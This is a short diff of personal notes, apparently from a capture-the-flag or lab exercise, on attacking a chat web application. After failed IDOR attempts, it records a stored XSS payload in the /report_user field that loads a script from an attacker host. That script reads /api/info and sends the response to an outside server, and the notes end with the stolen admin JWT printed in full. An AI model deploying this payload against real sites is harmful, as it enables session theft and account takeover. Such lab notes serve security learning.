@@ -1,2 +1,21 @@
 tried different things like injection js in the chat, or reporting myself or my ip. Tried IDOR for 
 /api/get_user_message
+
+
+/report_user vuln to XSS: <img src=\"http://ip\">
+
+so:
+
+<img src=\"1\" onerror=\"this.remove();var s=document.createElement('script');s.src='http://10.10.16.8:9999/script.js';document.body.appendChild(s);\">
+
+with a script.js hosted that sends back the results
+
+fetch('/api/info').then(response => response.text()).then(text => {
+    fetch('http://10.10.X.X:8000/log?' + text, {
+        mode: 'no-cors'
+    });
+});
+
+you get admin token
+
+22eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTc0MTg3NDE5MywianRpIjoiNWIzMjlhNmEtM2Q1YS00YTU0LTk1MDctZmJhZDVmNjc4YjIzIiwidHlwZSI6ImFjY2VzcyIsInN1YiI6ImFkbWluIiwibmJmIjoxNzQxODc0MTkzLCJleHAiOjE3NDI0Nzg5OTN9.NmW_MYn2QpvMQcAEBIqpqXZFY2b6ithHlN_hdIr_keM
